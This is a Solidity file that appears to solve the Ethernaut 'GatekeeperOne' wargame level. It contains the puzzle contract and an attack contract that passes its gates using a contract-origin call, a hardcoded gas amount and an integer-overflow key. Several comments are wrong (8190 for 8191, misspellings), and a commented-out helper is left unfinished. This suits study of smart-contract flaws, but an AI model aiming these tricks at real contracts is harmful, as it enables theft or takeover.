pragma solidity ^0.4.24;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}



contract GatekeeperOneAttack {

    GatekeeperOne victim;

    constructor(address _victim) public {
        victim = GatekeeperOne(_victim);
    }

    //the victim's gates are exploitable:
    //gate1 = requires that the victim is called from a contract
    //gate2 = requires that the gas sent is divisible by 8190 (ie 81910) + enough gas to reach this gate. in remix js VM 82151 works
    //gate3 requires that gatekey overflows uin16 and uint32 by uint16(tx.orgin) address
    function attack() external returns(bool success) {
        uint overflowVal = 4294967296 + uint16(msg.sender);
        bytes8 gateKey = bytes8(overflowVal);
        victim.enter.gas(82152)(gateKey);

        return true;
    }

    // function getGateKey(bytes8 _gateKey) external view
    //     returns (uint16 res1, uint32 res2, uint64 res3, uint16 txorigRes, bytes8 debug, uint8 fail) {
    //     res1 = uint16(_gateKey);
    //     res2 = uint32(_gateKey);
    //     res3 = uint64(_gateKey);
    //     txorigRes = uint16(tx.origin); //==0x000000010000733c if addr = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c
    //     debug = bytes8(4294996796);

    //     if (res2 == res1) {
    //         fail += 1;
    //     }
    //     if (res2 != res3) {
    //         fail += 2;
    //     }
    //     if (res2 == txorigRes) {
    //         fail += 4;
    //     }

    // function getBalance() external view returns(uint256 localBalance, uint256 remoteBalance) {
    //     return (address(this).balance, address(victim).balance); //victim should be zero
    // }    
}
